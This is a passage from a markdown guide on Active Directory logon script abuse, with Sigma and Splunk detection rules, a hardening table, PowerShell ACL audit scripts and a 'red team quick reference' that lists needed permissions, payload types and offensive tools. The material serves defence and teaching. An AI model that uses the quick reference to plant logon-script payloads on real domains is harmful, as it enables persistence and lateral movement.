description: Detects PowerShell being launched as a child of userinit.exe, indicating logon script execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\userinit.exe'
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
  filter_legitimate:
    CommandLine|contains:
      - 'gpupdate'
      - 'logon.ps1'  # adjust to known-good scripts
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate logon scripts invoking PowerShell
level: high
tags:
  - attack.execution
  - attack.t1037.003
```

### Splunk Queries

#### Hunt for `scriptPath` Changes

```splunk
index=dc_security EventCode=4738
| where isnotnull(ScriptPath) AND ScriptPath != "-"
| stats count by SubjectUserName, TargetUserName, ScriptPath, _time
| sort -_time
```

#### Correlate NETLOGON Writes with User Logons

```splunk
index=dc_security (EventCode=5145 ShareName="NETLOGON" AccessMask="0x2")
| join type=inner SubjectUserName
    [search index=dc_security EventCode=4624 LogonType=3]
| table _time, SubjectUserName, RelativeTargetName, IpAddress
| sort -_time
```

#### Detect Encoded PowerShell in Logon Context

```splunk
index=windows EventCode=4688
| where ParentProcessName like "%userinit%"
| where CommandLine like "%EncodedCommand%" OR CommandLine like "%-enc %"
| table _time, ComputerName, SubjectUserName, CommandLine
```

---

## Hardening & Mitigation

| Control | Implementation |
|---|---|
| **Restrict NETLOGON/SYSVOL write permissions** | Only Domain Admins should have write access. Audit with `smbcacls` or `icacls`. |
| **Audit `scriptPath` attribute ACEs** | Remove `WriteProperty` on Script-Path from non-admin users. |
| **Enable AD object auditing** | Audit all writes to `scriptPath` (Event ID 5136) via Advanced Audit Policy. |
| **Audit NETLOGON file changes** | Enable SACL on `%systemroot%\SYSVOL\sysvol\<domain>\scripts\` for write/modify. |
| **Run ScriptSentry regularly** | Automate detection of misconfigurations in logon scripts. |
| **Remove plaintext credentials from scripts** | Use Group Managed Service Accounts (gMSA) or Windows Credential Manager instead. |
| **Minimize users with logon scripts** | Audit `scriptPath` with `Get-ADUser -Filter * -Properties scriptPath`. |
| **Migrate to Modern logon scripts (GPO)** | GPO scripts provide better ACL control and audit trail. |
| **Harden UNC Paths** | Enforce `RequireMutualAuthentication=1` and `RequireIntegrity=1` for NETLOGON and SYSVOL. |

### PowerShell Audit: Find All Users with scriptPath Set

```powershell
# Enumerate all users with scriptPath configured
Get-ADUser -Filter * -Properties scriptPath, SamAccountName, DistinguishedName |
    Where-Object { $_.scriptPath -ne $null -and $_.scriptPath -ne "" } |
    Select-Object SamAccountName, scriptPath, DistinguishedName |
    Export-Csv -Path "C:\Audit\scriptpath_audit.csv" -NoTypeInformation
```

### PowerShell Audit: Find Non-Admin Write ACEs on scriptPath

```powershell
Import-Module ActiveDirectory

$allUsers = Get-ADUser -Filter * -Properties DistinguishedName
foreach ($user in $allUsers) {
    $acl = Get-Acl -Path "AD:\$($user.DistinguishedName)"
    foreach ($ace in $acl.Access) {
        if ($ace.ObjectType -eq [Guid]"bf9679a8-0de6-11d0-a285-00aa003049e2" `
            -and $ace.ActiveDirectoryRights -match "Write" `
            -and $ace.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM") {
            [PSCustomObject]@{
                TargetUser  = $user.SamAccountName
                GrantedTo   = $ace.IdentityReference
                Rights      = $ace.ActiveDirectoryRights
            }
        }
    }
}
```

---

## Summary

```
┌──────────────────────────────────────────────────────────────────────┐
│               LOGON SCRIPTS — RED TEAM QUICK REFERENCE               │
├──────────────────┬───────────────────────────────────────────────────┤
│  Attribute       │  scriptPath (GUID: bf9679a8-0de6-11d0-a285-...)   │
│  Required ACE    │  WriteProperty on Script-Path                     │
│  Also needed     │  Write access anywhere in NETLOGON share          │
│  Payload types   │  .bat, .vbs, .cmd, .exe (not .ps1 directly)       │
│  Execution       │  On next user logon, via userinit.exe             │
│  MITRE           │  T1037.003 (Network Logon Script)                 │
├──────────────────┼───────────────────────────────────────────────────┤
│  Linux tools     │  PywerView, dacledit, bloodyAD, ldapmodify,       │
│                  │  smbclient, smbcacls, Adalanche                   │
│  Windows tools   │  PowerView, ScriptSentry, SharpGPOAbuse, icacls  │
├──────────────────┼───────────────────────────────────────────────────┤
│  Detection       │  Event IDs: 4738, 5136, 5145, 4663, 4688          │
│  Mitigation      │  Audit scriptPath ACEs, restrict NETLOGON write,  │
│                  │  enable SACL auditing, run ScriptSentry           │
└──────────────────┴───────────────────────────────────────────────────┘
```

---

## References

- [MS-ADA3: scriptPath Attribute — Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)
- [MITRE ATT&CK T1037.003 — Network Logon Script](https://attack.mitre.org/techniques/T1037/003/)
- [ScriptSentry — techspence](https://github.com/techspence/ScriptSentry)
- [Hidden Menace: How to Identify Misconfigured and Dangerous Logon Scripts — offsec.blog](https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/)
- [PywerView — the-useless-one](https://github.com/the-useless-one/pywerview)
- [bloodyAD — CravateRouge](https://github.com/CravateRouge/bloodyAD)
- [Adalanche — lkarlslund](https://github.com/lkarlslund/Adalanche)
- [dacledit — Impacket PR #1291](https://github.com/fortra/impacket/pull/1291)
- [PowerSploit PowerView — PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [DACL Abuse — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/)
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
- [GPO Abuse — Logon Script Persistence — LinkedIn/INTRINSEC](https://www.intrinsec.com/en/hide-the-threat-gpo-lateral-movement/)
- [Cayosoft — AD Misconfigured UNC Paths](https://www.cayosoft.com/threat-directory/ad-domain-with-misconfigured-unc-paths-policies/)
- [RL Mueller — Logon Script FAQ](https://www.rlmueller.net/LogonScriptFAQ.htm)
